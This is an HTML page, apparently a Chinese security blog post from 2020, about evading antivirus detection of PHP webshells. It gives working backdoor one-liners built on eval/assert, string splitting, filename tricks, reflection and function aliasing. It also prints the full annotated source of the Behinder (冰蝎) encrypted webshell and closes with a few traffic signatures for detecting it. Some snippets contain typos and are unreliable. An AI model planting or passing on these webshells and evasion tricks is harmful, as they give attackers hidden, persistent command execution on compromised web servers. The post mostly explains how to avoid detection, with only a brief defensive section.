@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"karr0y.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="webshell免杀webshell是以asp，php，jsp或者cgi等网页存在的一种命令执行环境，也可以将其称作是一种网页后门。在入侵了一个网站以后，通常会将asp或者php后门文件与网站服务器web目录下正常的网页文件混在一起，然后就可以实验浏览器来访问和asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 Webshell的变形技术总结执行命令函数和执行代码函数，比如e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell 免杀">
+<meta property="og:url" content="http://karr0y.github.io/undefined/7cbd735b.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="webshell免杀webshell是以asp，php，jsp或者cgi等网页存在的一种命令执行环境，也可以将其称作是一种网页后门。在入侵了一个网站以后，通常会将asp或者php后门文件与网站服务器web目录下正常的网页文件混在一起，然后就可以实验浏览器来访问和asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 Webshell的变形技术总结执行命令函数和执行代码函数，比如e">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-20T22:29:55.000Z">
+<meta property="article:modified_time" content="2020-08-20T22:31:43.951Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://karr0y.github.io/undefined/7cbd735b.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Webshell 免杀 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://karr0y.github.io/undefined/7cbd735b.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Webshell 免杀
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-08-21 06:29:55 / Modified: 06:31:43" itemprop="dateCreated datePublished" datetime="2020-08-21T06:29:55+08:00">2020-08-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="webshell免杀"><a href="#webshell免杀" class="headerlink" title="webshell免杀"></a>webshell免杀</h1><p><strong>webshell</strong>是以asp，php，jsp或者cgi等网页存在的一种命令执行环境，也可以将其称作是一种网页后门。在入侵了一个网站以后，通常会将asp或者php后门文件与网站服务器web目录下正常的网页文件混在一起，然后就可以实验浏览器来访问和asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
+<h4 id="Webshell的变形技术总结"><a href="#Webshell的变形技术总结" class="headerlink" title="Webshell的变形技术总结"></a>Webshell的变形技术总结</h4><p>执行命令函数和执行代码函数，比如eval(),assert(),system(),popen(),shell_exec()很容易被查杀，所以变形的本质在于如何隐藏自己的敏感函数</p>
+<a id="more"></a>
+
+<h5 id="利用超全局变量"><a href="#利用超全局变量" class="headerlink" title="利用超全局变量"></a>利用超全局变量</h5><ul>
+<li><p>利用$GLOBALS（是PHP的一个超级全局的变量组，在一个PHP脚本的全部作用域之中都可以访问）：由于很多软件只检查**$_POST<strong>所以通过</strong>$GLOBALS**能够逃过查杀</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>($GLOBALS[<span class="string">&#x27;_POST&#x27;</span>])</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用$_FILES（通过HTTP POST的方式上传到当前脚本项目的数组）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>($FILE[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="关键字的替换"><a href="#关键字的替换" class="headerlink" title="关键字的替换"></a>关键字的替换</h5><h6 id="敏感函数拆分"><a href="#敏感函数拆分" class="headerlink" title="敏感函数拆分"></a>敏感函数拆分</h6><p>利用PHP语法的灵活性将一些敏感函数拆分再连接起来</p>
+<p>比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$k=<span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span> ;</span><br><span class="line">$k($&#123;<span class="string">&quot;_G&quot;</span>.<span class="string">&quot;ET&quot;</span>&#125;[<span class="string">&#x27;pass&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>主要是利用PHP的可变函数(可变函数的定义是可变变量，指的是函数调用时，该函数的名字可以是一个变量，PHP自动，根据变量的值去寻找同名函数)(PHP支持可变函数的概念，这意味着如果一个变量名后又圆括号，PHP将寻找与变量同名的函数，并且尝试执行它)。</p>
+<p>但是可变函数不能用于例如echo(),print(),unset(),isset(),empty(),include(),require()及其类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数</p>
+<h6 id="空格替换-amp-字符串替换"><a href="#空格替换-amp-字符串替换" class="headerlink" title="空格替换&amp;字符串替换"></a>空格替换&amp;字符串替换</h6><p>将关键函数进行倒转以及空格，之后再利用strrev()–反转字符串的函数和str_replace()对子字符串进行替换将空格去掉</p>
+<h5 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h5><h6 id="一些不包含数字和字母的webshell"><a href="#一些不包含数字和字母的webshell" class="headerlink" title="一些不包含数字和字母的webshell"></a>一些不包含数字和字母的webshell</h6><p><strong>思路</strong>：将非字母和数字经过各种变换，最后能构造出来a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，然后进行动态执行。</p>
+<h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以可以通过异或操作，通过两个非字母，非数字的字符，他们的异或或结果得到想要的字母</p>
+<h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><p>通过取反</p>
+<p>逻辑取反</p>
+<p><strong>！</strong>：表示逻辑取反，即把非0 的数值变为0，0变为1</p>
+<p>按位取反</p>
+<p>**~**：表示按位取反，即在数值的二进制表示方式上，将0变为1，将1变为0        </p>
+<h6 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h6><p>根据PHP处理字符变量的算数运算时的特性：<strong>字符变量只能递增不能递减</strong></p>
+<p>‘a’++=&gt;’b’,’b’++=&gt;c…………以此类推，所以值需要一个变量，其值为a，通过自增可以获得a-z中所有的字符</p>
+<p><strong>如何让得到‘a’字符</strong></p>
+<p>数组(Array)的第一个字母就是大写的A，第四个字符就是小写的a，所以可以根据这个特性得到a-z和A-Z</p>
+<h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><p>使用十六进制或者八进制昏庸的方式代替base64_decode()从而达到隐藏函数的目的</p>
+<h5 id="反序列化执行"><a href="#反序列化执行" class="headerlink" title="反序列化执行"></a>反序列化执行</h5><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><h5 id="利用文件名和注释"><a href="#利用文件名和注释" class="headerlink" title="利用文件名和注释"></a>利用文件名和注释</h5><p>在文件名或者注释之中添加敏感函数</p>
+<p><strong>no_assert.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;<span class="string">&quot;function&quot;</span>&#125;=substr(<span class="keyword">__FILE__</span>,<span class="number">-10</span>,<span class="number">-4</span>);;</span><br><span class="line">$&#123;<span class="string">&quot;command&quot;</span>&#125;=$_POST[cmd];</span><br><span class="line">$function($command);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>$function-&gt;assert形成了assert($_POST[cmd]);的后门</p>
+<h5 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h5><h6 id="十六进制执行"><a href="#十六进制执行" class="headerlink" title="十六进制执行"></a>十六进制执行</h6><h5 id="自定义加密"><a href="#自定义加密" class="headerlink" title="自定义加密"></a>自定义加密</h5><h5 id="反射技术"><a href="#反射技术" class="headerlink" title="反射技术"></a>反射技术</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="keyword">new</span> ReflectionFunction($_GET[m]);</span><br><span class="line"><span class="keyword">echo</span> $func-&gt;invokeArgs(<span class="keyword">array</span>($_GET[c]));</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件加密"><a href="#文件加密" class="headerlink" title="文件加密"></a>文件加密</h5><h6 id="混淆加密"><a href="#混淆加密" class="headerlink" title="混淆加密"></a>混淆加密</h6><h6 id="使用加密工具加密"><a href="#使用加密工具加密" class="headerlink" title="使用加密工具加密"></a>使用加密工具加密</h6><h6 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h6><p>使用python编写的webshell工具</p>
+<h4 id="PHP动态性的捕捉与逃逸"><a href="#PHP动态性的捕捉与逃逸" class="headerlink" title="PHP动态性的捕捉与逃逸"></a>PHP动态性的捕捉与逃逸</h4><p>PHP的动态特性：一段代码，其中变量值的改变可能导致这段代码发生功能上的改变</p>
+<p><strong>webshell常见的类型</strong></p>
+<ul>
+<li><p>直接型：常见的eval，assert一句话木马</p>
+</li>
+<li><p>变形型：编码，加密，压缩或者一些动态方法调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ucwords() <span class="comment">//函数把字符串中每个单词的首字符转换为大写。</span></span><br><span class="line">ucfirst() <span class="comment">//函数把字符串中的首字符转换为大写。</span></span><br><span class="line">trim() <span class="comment">//函数从字符串的两端删除空白字符和其他预定义字符。</span></span><br><span class="line">substr_replace() <span class="comment">//函数把字符串的一部分替换为另一个字符串</span></span><br><span class="line">substr() <span class="comment">//函数返回字符串的一部分。</span></span><br><span class="line">strtr() <span class="comment">//函数转换字符串中特定的字符。</span></span><br><span class="line">strtoupper() <span class="comment">//函数把字符串转换为大写。</span></span><br><span class="line">strtolower() <span class="comment">//函数把字符串转换为小写。</span></span><br><span class="line">strtok() <span class="comment">//函数把字符串分割为更小的字符串</span></span><br><span class="line">str_rot13() <span class="comment">//函数对字符串执行 ROT13 编码。</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>回调型：回调后门</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array()</span><br><span class="line">call_user_func()</span><br><span class="line">array_filter() </span><br><span class="line">array_walk()  </span><br><span class="line">array_map()</span><br><span class="line">registregister_shutdown_function()</span><br><span class="line">register_tick_function()</span><br><span class="line">filter_var() </span><br><span class="line">filter_var_array() </span><br><span class="line">uasort() </span><br><span class="line">uksort() </span><br><span class="line">array_reduce()</span><br><span class="line">array_walk() </span><br><span class="line">array_walk_recursive()</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>命令型：通过命令执行函数或者反引号来执行用户输入的参数</p>
+</li>
+<li><p>包含型</p>
+</li>
+<li><p>技巧型：</p>
+<ul>
+<li>可以忽略大小写的：用户定义类，用户定义函数，内置结构，关键字</li>
+<li>标签：XML型，SGML型（短标签），ASP标签（确保asp_tags打开），Script标签</li>
+<li>PHP的类型</li>
+<li>松散比较</li>
+</ul>
+</li>
+</ul>
+<h5 id="函数别名-命名空间"><a href="#函数别名-命名空间" class="headerlink" title="函数别名/命名空间"></a>函数别名/命名空间</h5><p>使用<strong>use function a as b</strong>来导入函数函数a，但是在当前空间以b来命名，在表现形式上来看，就类似于将函数重名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">funtion</span> <span class="title">assert</span> <span class="title">as</span> <span class="title">test</span>;</span><br><span class="line"></span><br><span class="line">    test($_POST[cmd]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><h4 id="shell分析"><a href="#shell分析" class="headerlink" title="shell分析"></a>shell分析</h4><p>shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),<span class="number">16</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;k&#x27;</span>]=$key;</span><br><span class="line">    <span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查看$_GET变量是否存在pass,如果存在的话根据实践生成16位的随机密钥存储在seesion之中</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    $post=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        $t=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        $post=$t($post.<span class="string">&quot;&quot;</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">                 $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断是否开启了openssl插件</span></span><br><span class="line">    <span class="comment">//如果开启了，使用AES进行加密，发送至服务端，服务端接收之后进行AES解密，得到中间结果字符串assert|eval(&quot;phpinfo();&quot;),服务端利用explode函数将拆分为一个字符串数据，然后以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)</span></span><br><span class="line">    <span class="comment">//如果没有开启openssl，进行异或处理然后通过base64加密</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $post=openssl_decrypt($post, <span class="string">&quot;AES128&quot;</span>, $key);</span><br><span class="line">    &#125;</span><br><span class="line">    $arr=explode(<span class="string">&#x27;|&#x27;</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$p</span>) </span>&#123;<span class="keyword">eval</span>($p.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="keyword">new</span> C($params);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php基于GET请求包的检测特征</p>
+<ol>
+<li>url包含.php?pass=(在密码未修改的情况下)</li>
+<li>请求body包含Content-Length:16</li>
+</ol>
+<p>基于GET响应包的检测特征：返回16位密钥</p>
+<p>基于POST请求包的检测特征：Content-Type： application/x-www-form-urlencoded </p>
+<p>基于POST响应包的检测特征：Transfer-Encoding: chunked </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/undefined/4a17b156.html" rel="prev" title="Hello World">
+      <i class="fa fa-chevron-left"></i> Hello World
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell%E5%85%8D%E6%9D%80"><span class="nav-number">1.</span> <span class="nav-text">webshell免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Webshell%E7%9A%84%E5%8F%98%E5%BD%A2%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">Webshell的变形技术总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">1.0.0.1.1.</span> <span class="nav-text">利用超全局变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.0.0.1.2.</span> <span class="nav-text">关键字的替换</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%E6%8B%86%E5%88%86"><span class="nav-number">1.0.0.1.2.1.</span> <span class="nav-text">敏感函数拆分</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E6%9B%BF%E6%8D%A2-amp-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.0.0.1.2.2.</span> <span class="nav-text">空格替换&amp;字符串替换</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="nav-number">1.0.0.1.3.</span> <span class="nav-text">特殊字符</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><span class="nav-number">1.0.0.1.3.1.</span> <span class="nav-text">一些不包含数字和字母的webshell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.0.0.1.3.2.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.0.0.1.3.3.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">1.0.0.1.3.4.</span> <span class="nav-text">方法三</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.0.0.1.4.</span> <span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C"><span class="nav-number">1.0.0.1.5.</span> <span class="nav-text">反序列化执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="nav-number">1.0.0.1.6.</span> <span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E5%92%8C%E6%B3%A8%E9%87%8A"><span class="nav-number">1.0.0.1.7.</span> <span class="nav-text">利用文件名和注释</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="nav-number">1.0.0.1.8.</span> <span class="nav-text">自定义函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%89%A7%E8%A1%8C"><span class="nav-number">1.0.0.1.8.1.</span> <span class="nav-text">十六进制执行</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8A%A0%E5%AF%86"><span class="nav-number">1.0.0.1.9.</span> <span class="nav-text">自定义加密</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E6%8A%80%E6%9C%AF"><span class="nav-number">1.0.0.1.10.</span> <span class="nav-text">反射技术</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86"><span class="nav-number">1.0.0.1.11.</span> <span class="nav-text">文件加密</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86"><span class="nav-number">1.0.0.1.11.1.</span> <span class="nav-text">混淆加密</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%8A%A0%E5%AF%86%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86"><span class="nav-number">1.0.0.1.11.2.</span> <span class="nav-text">使用加密工具加密</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Weevely"><span class="nav-number">1.0.0.1.11.3.</span> <span class="nav-text">Weevely</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E5%8A%A8%E6%80%81%E6%80%A7%E7%9A%84%E6%8D%95%E6%8D%89%E4%B8%8E%E9%80%83%E9%80%B8"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">PHP动态性的捕捉与逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%AB%E5%90%8D-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-number">1.0.0.2.1.</span> <span class="nav-text">函数别名&#x2F;命名空间</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E"><span class="nav-number">1.1.</span> <span class="nav-text">冰蝎</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shell%E5%88%86%E6%9E%90"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">shell分析</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
